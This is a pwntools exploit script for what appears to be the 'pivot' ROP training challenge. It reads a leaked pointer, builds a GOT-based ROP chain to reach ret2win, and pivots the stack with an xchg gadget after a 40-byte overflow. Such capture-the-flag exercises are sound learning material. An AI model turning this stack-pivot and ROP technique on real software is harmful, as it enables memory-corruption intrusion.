#!/usr/bin/env python
from pwn import *

context.log_level = 'debug'
context.terminal = ['lxterminal', '-e']

local = 1
if local:
	p = process('./pivot')
	elf = ELF('./pivot')
	libc = ELF('./libpivot.so')
else:
	p = remote()

p.recvuntil('pivot: ')
ptr = int(p.recv(14)[2:], 16)
info('ptr = ' + hex(ptr))

foothold_plt = elf.plt['foothold_function']
foothold_got = elf.got['foothold_function']
offset = libc.symbols['ret2win'] - libc.symbols['foothold_function']

pop_rax_ret = 0x0000000000400b00
add_rax_rbp_ret = 0x0000000000400b09
pop_rbp_ret = 0x0000000000400900
mov_rax_prax_ret = 0x0000000000400b05
call_rax = 0x000000000040098e

gdb.attach(p)

payload = p64(foothold_plt) + \
          p64(pop_rax_ret) + \
          p64(foothold_got) + \
          p64(mov_rax_prax_ret) + \
          p64(pop_rbp_ret) + \
          p64(offset) + \
          p64(add_rax_rbp_ret) + \
          p64(call_rax)

p.recvuntil('> ')
p.sendline(payload)

leave_ret = 0x0000000000400a39
xchg_rax_rsp_ret = 0x0000000000400b02

payload = cyclic(0x40)
payload = 'A' * 40 + p64(pop_rax_ret) + p64(ptr) + p64(xchg_rax_rsp_ret)

p.recvuntil('> ')
p.sendline(payload)

p.interactive()
